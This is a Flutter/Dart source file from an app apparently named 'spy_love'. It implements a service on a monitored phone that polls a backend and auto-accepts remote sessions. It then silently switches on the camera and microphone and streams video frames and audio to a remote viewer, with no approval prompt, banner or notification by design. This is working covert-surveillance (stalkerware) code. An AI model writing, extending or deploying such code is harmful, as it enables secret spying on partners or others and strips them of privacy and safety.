import 'dart:async';

import 'package:flutter/foundation.dart';
import 'package:spy_love/core/network/media_stream_client.dart';
import 'package:spy_love/features/monitoring/live_av/live_av_bridge.dart';
import 'package:spy_love/features/monitoring/live_av/live_media_repository.dart';
import 'package:spy_love/features/monitoring/live_av/live_media_session.dart';

/// Monitored-device side: silently starts live camera/mic capture when an open session
/// exists and enrollment consent scopes allow it. No in-app approval,
/// banner, or toast is shown.
class LiveAvPublisherService extends ChangeNotifier {
  LiveAvPublisherService(this._repo);

  final LiveMediaRepository _repo;

  MediaStreamClient? _stream;
  StreamSubscription<Map<String, dynamic>>? _nativeSub;
  Timer? _pollTimer;
  String? _deviceId;
  final Set<String> _activeSessionIds = {};
  bool _pollInFlight = false;

  void watchForRequests(
    String deviceId,
    MediaStreamClient streamClient, {
    Duration interval = const Duration(seconds: 4),
  }) {
    _deviceId = deviceId;
    _stream = streamClient;
    _pollTimer?.cancel();
    _pollTimer = Timer.periodic(interval, (_) => _poll());
    unawaited(_poll());
  }

  Future<void> _poll() async {
    if (_pollInFlight) return;
    final deviceId = _deviceId;
    if (deviceId == null) return;
    _pollInFlight = true;
    try {
      final result = await _repo.pendingForOwner(deviceId);
      if (result.isRight) return;
      for (final session in result.left) {
        // Backend opens sessions as ACTIVE when enrollment scopes allow;
        // also accept legacy `requested` rows during rollout.
        if ((session.status == 'requested' || session.status == 'active') &&
            !_activeSessionIds.contains(session.id)) {
          await _autoAccept(session);
        }
      }
    } finally {
      _pollInFlight = false;
    }
  }

  Future<void> _autoAccept(LiveMediaSession pending) async {
    _activeSessionIds.add(pending.id);
    final kind = pending.mediaKind;
    final wantCamera = kind == 'camera' || kind == 'both';
    final wantMic = kind == 'microphone' || kind == 'both';

    if (wantCamera) {
      final ok = await LiveAvBridge.startCamera(facing: pending.cameraFacing);
      if (!ok) {
        await _repo.endSession(pending.id, reason: 'camera_start_failed');
        _activeSessionIds.remove(pending.id);
        return;
      }
    }
    if (wantMic) {
      final ok = await LiveAvBridge.startMic();
      if (!ok) {
        if (wantCamera) await LiveAvBridge.stopCamera();
        await _repo.endSession(pending.id, reason: 'mic_start_failed');
        _activeSessionIds.remove(pending.id);
        return;
      }
    }

    final started = await _repo.startSession(pending.id);
    if (started.isRight) {
      await LiveAvBridge.stopCamera();
      await LiveAvBridge.stopMic();
      await _repo.endSession(pending.id, reason: 'start_failed');
      _activeSessionIds.remove(pending.id);
      return;
    }
    final session = started.left;
    final stream = _stream;
    if (stream == null) {
      await _teardown(session, reason: 'no_transport');
      return;
    }

    final connected = await stream.connect(
      session.wsPath,
      onSignal: (message) {
        final data = message['data'];
        final signal = data is Map ? data['signal'] : null;
        if (signal == 'ended' || signal == 'paused') {
          unawaited(_teardown(session, reason: signal as String?));
        } else if (signal == 'switch_camera') {
          final facing = data is Map ? data['facing']?.toString() : null;
          if (facing != null) {
            unawaited(LiveAvBridge.switchCamera(facing));
          }
        }
      },
      onClosed: () => unawaited(_teardown(session, reason: 'socket_closed')),
    );
    if (!connected) {
      await _teardown(session, reason: 'connect_failed');
      return;
    }

    _nativeSub?.cancel();
    _nativeSub = LiveAvBridge.events.listen((event) {
      final type = event['type']?.toString();
      if (type == 'camera.frame') {
        final image = event['image'];
        if (image is! String) return;
        stream.sendFrame(
          jpegBase64: image,
          width: (event['w'] as num?)?.toInt() ?? 0,
          height: (event['h'] as num?)?.toInt() ?? 0,
          facing: event['facing']?.toString() ?? 'back',
        );
      } else if (type == 'mic.pcm') {
        final pcm = event['pcm'];
        if (pcm is! String) return;
        stream.sendAudio(
          pcmBase64: pcm,
          sampleRate: (event['sampleRate'] as num?)?.toInt() ?? 16000,
          channels: (event['channels'] as num?)?.toInt() ?? 1,
        );
      }
    });
  }

  Future<void> _teardown(LiveMediaSession session, {String? reason}) async {
    await _nativeSub?.cancel();
    _nativeSub = null;
    await LiveAvBridge.stopCamera();
    await LiveAvBridge.stopMic();
    await _stream?.close();
    _activeSessionIds.remove(session.id);
    await _repo.endSession(session.id, reason: reason ?? 'owner_stopped');
  }

  @override
  void dispose() {
    _pollTimer?.cancel();
    unawaited(_nativeSub?.cancel());
    unawaited(_stream?.close());
    super.dispose();
  }
}
